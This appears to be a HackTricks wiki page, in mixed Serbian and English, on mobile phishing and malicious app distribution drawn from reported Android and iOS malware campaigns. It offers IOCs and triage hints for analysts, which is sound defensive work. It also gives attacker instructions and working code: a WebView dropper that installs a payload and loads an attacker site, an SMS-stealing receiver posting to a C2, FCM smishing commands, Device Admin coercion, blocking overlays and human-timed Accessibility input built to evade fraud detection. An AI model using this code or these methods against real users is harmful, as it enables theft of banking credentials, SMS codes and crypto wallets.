# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica pokriva tehnike koje koriste threat actors za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** kroz phishing (SEO, social engineering, fake stores, dating apps, itd.).
> Materijal je prilagođen iz SarangTrap kampanje koju je otkrio Zimperium zLabs (2025) i drugih javnih istraživanja.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registruj desetine look-alike domena (dating, cloud share, car service…).
– Koristi ključne reči na lokalnom jeziku i emoji-je u elementu `<title>` da bi rangirao u Google.
– Hostuj *i* Android (`.apk`) i iOS instalacione instrukcije na istoj landing stranici.
2. **First Stage Download**
* Android: direktan link ka *unsigned* ili “third-party store” APK.
* iOS: `itms-services://` ili običan HTTPS link ka malicious **mobileconfig** profilu (vidi dole).
3. **Post-install Social Engineering**
* Pri prvom pokretanju aplikacija traži **invitation / verification code** (iluzija ekskluzivnog pristupa).
* Kod se **POSTuje preko HTTP** na Command-and-Control (C2).
* C2 odgovara `{"success":true}` ➜ malware nastavlja.
* Sandbox / AV dinamička analiza koja nikad ne pošalje validan kod ne vidi **nikakvo malicious ponašanje** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions se traže tek **nakon pozitivnog C2 odgovora**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Starije verzije su takođe tražile SMS permissions -->
```
* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin code path koji čita SMS preko reflection ⇒ smanjuje static score dok i dalje funkcioniše na uređajima koji daju permission kroz `AppOps` abuse ili stare ciljeve.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 je uveo **Restricted settings** za sideloaded apps: Accessibility i Notification Listener prekidači su onemogućeni dok korisnik eksplicitno ne dozvoli restricted settings u **App info**.
* Phishing stranice i droppers sada isporučuju instrukcije korak po korak da se **dozvole restricted settings** za sideloaded app i zatim omogući Accessibility/Notification access.
* Noviji bypass je da se payload instalira preko **session-based PackageInstaller flow** (isti metod koji koriste app stores). Android tada tretira app kao store-installed, pa Restricted settings više ne blokira Accessibility.
* Triage hint: u dropperu, grep za `PackageInstaller.createSession/openSession` plus code koji odmah vodi žrtvu na `ACTION_ACCESSIBILITY_SETTINGS` ili `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Aplikacija prikazuje bezopasne views (SMS viewer, gallery picker) implementirane lokalno.
* U međuvremenu exfiltrira:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG iz `/sdcard/DCIM` komprimovan sa [Luban](https://github.com/Curzibn/Luban) da bi se smanjila veličina
- Opcioni SMS sadržaj (`content://sms`)
Payloads se **batch-zipuju** i šalju putem `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Jedan **mobile-configuration profile** može da zatraži `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da bi enrolovao device u “MDM”-like supervision.
* Social-engineering instrukcije:
1. Otvori Settings ➜ *Profile downloaded*.
2. Dodirni *Install* tri puta (screenshots na phishing stranici).
3. Trust the unsigned profile ➜ attacker dobija *Contacts* & *Photo* entitlement bez App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads mogu da **prikače phishing URL na Home Screen** sa brendiranim icon/label.
* Web Clips mogu da rade **full-screen** (sakriva browser UI) i mogu biti označeni kao **non-removable**, primoravajući žrtvu da obriše profile da bi uklonila icon.
9. **Network Layer**
* Plain HTTP, često na portu 80 sa HOST header kao `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS → lako za uočavanje).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Tokom malware procene, automatizuj invitation code fazu sa Frida/Objection da bi došao do malicious grane.
* **Manifest vs. Runtime Diff** – Uporedi `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms je red flag.
* **Network Canary** – Konfiguriši `iptables -p tcp --dport 80 -j NFQUEUE` da detektuje nesolid POST burstove nakon unosa koda.
* **mobileconfig Inspection** – Koristi `security cms -D -i profile.mobileconfig` na macOS da izlistaš `PayloadContent` i uočiš preterane entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatori (generički)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ovaj obrazac je primećen u kampanjama koje zloupotrebljavaju teme državnih beneficija da bi ukrali indijske UPI kredencijale i OTP-ove. Operateri povezuju ugledne platforme radi dostave i otpornosti.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Prvi APK je instalater (dropper) koji isporučuje pravi malware u `assets/app.apk` i traži od korisnika da isključi Wi‑Fi/mobile data kako bi umanjio cloud detekciju.
- Ugrađeni payload se instalira pod bezazlenom oznakom (npr. “Secure Update”). Nakon instalacije, i instalater i payload postoje kao zasebne aplikacije.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamičko otkrivanje endpoint-a putem shortlink-a
- Malware preuzima plain-text, zarezima razdvojenu listu aktivnih endpoint-a sa shortlink-a; jednostavne string transformacije generišu konačnu putanju phishing stranice.

Primer (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Korak “Make payment of ₹1 / UPI‑Lite” učitava napadačev HTML obrazac sa dinamičkog endpointa unutar WebView i hvata osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samopropagacija i SMS/OTP presretanje
- Na prvom pokretanju traže se agresivne dozvole:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se koriste za masovno slanje smishing SMS poruka sa uređaja žrtve.
- Dolazni SMS se presreću putem broadcast receiver-a i otpremaju sa metapodacima (pošiljalac, sadržaj, SIM slot, nasumični ID po uređaju) na `/addsm.php`.

Skica receiver-a:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kao resilient C2
- Payload se registruje na FCM; push poruke nose `_type` polje koje se koristi kao switch za pokretanje akcija (npr. update phishing text templates, toggle behaviours).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK sadrži sekundarni payload na `assets/app.apk`
- WebView učitava plaćanje iz `gate.htm` i exfiltrira na `/addup.php`
- SMS exfiltration na `/addsm.php`
- Shortlink-driven config fetch (npr. `rebrand.ly/*`) koji vraća CSV endpoints
- Aplikacije označene kao generički “Update/Secure Update”
- FCM `data` poruke sa `_type` discriminatorom u untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Napadači sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u lure-ove koji izgledaju kao Google Play. To skriva URL payload-a, zaobilazi URL/extension filtere i zadržava realističan UX instalacije.

Tipičan client flow primećen u praksi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto zaobilazi jednostavne kontrole:
- Nije izložen nijedan statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frame-ova.
- URL/MIME/ekstenzija filteri koji blokiraju direktne .apk odgovore mogu da propuste binarne podatke tunelovane preko WebSockets/Socket.IO.
- Crawler-i i URL sandbox-ovi koji ne izvršavaju WebSockets neće preuzeti payload.

Vidi i WebSocket tradecraft i tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT kampanja (ThreatFabric) je konkretan primer kako moderne mobile phishing operacije kombinuju WebView droppere, UI automatizaciju zasnovanu na Accessibility, overlay/ransom, Device Admin coercion, Automated Transfer System (ATS), preuzimanje crypto wallet-a, pa čak i NFC-relay orchestration. Ovaj odeljak apstraktuje tehnike koje se mogu ponovo koristiti.

### Stage-1: WebView → native install bridge (dropper)
Napadači prikazuju WebView koji pokazuje na napadačevu stranicu i ubacuju JavaScript interfejs koji izlaže native installer. Tap na HTML dugme poziva native kod koji instalira second-stage APK upakovan u asset-e droppera i zatim ga direktno pokreće.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML na stranici:
```html
<button onclick="bridge.installApk()">Install</button>
```
Nakon instalacije, dropper pokreće payload putem eksplicitnog package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideja lova: nepouzdane aplikacije pozivaju `addJavascriptInterface()` i izlažu metode nalik installer-u WebView-u; APK isporučuje ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + naknadni runtime prompts
Stage-2 otvara WebView koji hostuje “Access” stranicu. Njeno dugme poziva exported metodu koja vodi žrtvu do Accessibility settings i traži omogućavanje rogue service. Kada se to odobri, malware koristi Accessibility da automatski klikće kroz sledeće runtime permission dijaloge (contacts, overlay, manage system settings, itd.) i traži Device Admin.

- Accessibility programski pomaže da se prihvate kasniji promptovi tako što pronalazi dugmad poput “Allow”/“OK” u node-tree i izvršava klikove.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Pogledajte i:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatori mogu izdati komande za:
- prikaz full-screen overlay-a sa URL-a, ili
- prosleđivanje inline HTML-a koji se učitava u WebView overlay.

Verovatne upotrebe: prinuda (unos PIN-a), otvaranje wallet-a radi hvatanja PIN-ova, ransom poruke. Držite komandu koja obezbeđuje da je overlay permission dodeljena ako nedostaje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodično izbacivati Accessibility node tree, serijalizovati vidljive tekstove/role/bounds i slati ih na C2 kao pseudo-screen (komande kao `txt_screen` jednom i `screen_live` kontinuirano).
- High-fidelity: zatražiti MediaProjection i pokrenuti screen-casting/recording na zahtev (komande kao `display` / `record`).

### ATS playbook (bank app automation)
Na osnovu JSON zadatka, otvoriti bank app, upravljati UI-jem preko Accessibility sa kombinacijom text queries i coordinate taps, i uneti payment PIN žrtve kada se zatraži.

Primer zadatka:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Primeri tekstova viđenih u jednom ciljnom toku (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operatori takođe mogu da proveravaju/podižu limite prenosa putem komandi kao što su `check_limit` i `limit` koje navigiraju kroz UI za limite na sličan način.

### Crypto wallet seed extraction
Ciljevi poput MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: otključavanje (ukradeni PIN ili data lozinka), navigacija do Security/Recovery, otkrivanje/prikaz seed phrase, keylog/exfiltrate it. Implementirajte locale-aware selektore (EN/RU/CZ/SK) da biste stabilizovali navigaciju kroz različite jezike.

### Device Admin coercion
Device Admin API-jevi se koriste da bi se povećale šanse za PIN-capture i otežao život žrtvi:

- Immediate lock:
```java
dpm.lockNow();
```
- Ispiri trenutni credential da bi se naterala promena (Accessibility hvata novi PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Prisilno onemogućavanje otključavanja bez biometrije tako što se isključe biometrijske funkcije keyguard-a:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Napomena: Mnoge DevicePolicyManager kontrole zahtevaju Device Owner/Profile Owner na novijem Androidu; neki OEM buildovi mogu biti manje restriktivni. Uvek proverite na ciljnom OS/OEM.

### NFC relay orkestracija (NFSkate)
Stage-3 može da instalira i pokrene eksterni NFC-relay modul (npr. NFSkate) i čak da mu prosledi HTML template kako bi vodio žrtvu tokom relay-a. Ovo omogućava contactless card-present cash-out zajedno sa online ATS.

Pozadina: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Set operator komandi (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: ljudski ritam teksta i dual text injection (Herodotus)

Threat actors sve više kombinuju Accessibility-driven automatizaciju sa anti-detection podešenim protiv osnovnih biometrija ponašanja. Nedavni banker/RAT pokazuje dva komplementarna moda isporuke teksta i operator toggle za simulaciju ljudskog kucanja sa nasumičnim ritmom.

- Discovery mode: enumeriše vidljive čvorove sa selektorima i bounds kako bi precizno ciljao inpute (ID, text, contentDescription, hint, bounds) pre akcije.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` direktno na ciljnom čvoru (stabilno, bez tastature);
- Mode 2 – clipboard set + `ACTION_PASTE` u fokusirani čvor (radi kada je direktan setText blokiran).
- Ljudski ritam: podeli string koji je dao operator i isporučuj ga karakter po karakter sa nasumičnim kašnjenjima od 300–3000 ms između događaja kako bi se izbegle heuristike za “machine-speed typing”. Implementirano ili progresivnim povećavanjem vrednosti preko `ACTION_SET_TEXT`, ili lepljenjem jednog karaktera odjednom.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blokirajući overlay-ji za fraud pokrivaju:
- Renderuj pun ekran `TYPE_ACCESSIBILITY_OVERLAY` sa opacity-jem kojim upravlja operator; drži ga neprovidnim za žrtvu dok remote automation radi ispod.
- Komande koje se obično izlažu: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimalni overlay sa podesivim alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Multi-stage Android dropper with WebView bridge, JNI string decoder, and staged DEX loading

CERT Polska's 03 April 2026 analysis of **cifrat** is a good reference for a modern phishing-delivered Android loader where the visible APK is only an installer shell. The reusable tradecraft is not the family name, but the way the stages are chained:

1. Phishing page delivers a lure APK.
2. Stage 0 requests `REQUEST_INSTALL_PACKAGES`, loads a native `.so`, decrypts an embedded blob, and installs stage 2 with **PackageInstaller sessions**.
3. Stage 2 decrypts another hidden asset, treats it as a ZIP, and **dynamically loads DEX** for the final RAT.
4. Final stage abuses Accessibility/MediaProjection and uses WebSockets for control/data.

### WebView JavaScript bridge as the installer controller

Instead of using WebView only for fake branding, the lure can expose a bridge that lets a local/remote page fingerprint the device and trigger native install logic:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Ideje za triage:
- grep za `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` i remote phishing URLs korišćene u istoj activity
- prati bridge-ove koji izlažu installer-like metode (`start`, `install`, `openAccessibility`, `requestOverlay`)
- ako je bridge podržan phishing stranicom, tretiraj ga kao operator/controller surface, a ne samo kao UI

### Native string decoding registrated in `JNI_OnLoad`

Jedan koristan pattern je Java metoda koja izgleda bezazleno, ali je zapravo podržana sa `RegisterNatives` tokom `JNI_OnLoad`. U cifrat, decoder je ignorisao prvi char, koristio drugi kao 1-byte XOR key, hex-decoded preostali deo, i transformisao svaki byte kao `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Koristite ovo kada vidite:
- ponovljene pozive ka jednoj native-backed Java metodi za URL-ove, nazive paketa ili ključeve
- `JNI_OnLoad` rešava klase i poziva `RegisterNatives`
- nema smislenih plaintext stringova u DEX-u, ali ima mnogo kratkih konstanti koje liče na heksadecimalne vrednosti prosleđenih jednoj helper metodi

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Ova familija je koristila dva unpacking layera koja vredi generički tražiti:

- **Stage 0**: dekriptuje `res/raw/*.bin` pomoću XOR ključa izvedenog kroz native decoder, zatim instalira plaintext APK kroz `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: izvlači bezazlen asset kao što je `FH.svg`, dekriptuje ga pomoću RC4-like rutine, parsira rezultat kao ZIP, zatim učitava skrivene DEX fajlove

Ovo je jak indikator pravog dropper/loader pipeline-a, jer svaki layer održava sledeći stage neprozirnim za osnovno statičko skeniranje.

Brza checklist za triage:
- `REQUEST_INSTALL_PACKAGES` plus `PackageInstaller` session pozivi
- receiver-i za `PACKAGE_ADDED` / `PACKAGE_REPLACED` da nastave lanac nakon instalacije
- enkriptovani blob-ovi pod `res/raw/` ili `assets/` sa ne-medijskim ekstenzijama
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling blizu custom decryptor-a

### Native anti-debugging through `/proc/self/maps`

Native bootstrap je takođe skenirao `/proc/self/maps` za `libjdwp.so` i prekidao rad ako je prisutan. Ovo je praktična rana anti-analysis provera jer debugging zasnovan na JDWP ostavlja prepoznatljivu mapiranu biblioteku:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ideje za pretragu:
- grep native code / decompiler output za `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- ako Frida hook-ovi stignu prekasno, prvo proveri `.init_array` i `JNI_OnLoad`
- tretiraj anti-debug + string decoder + staged install kao jedan klaster, ne kao nezavisne nalaze

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
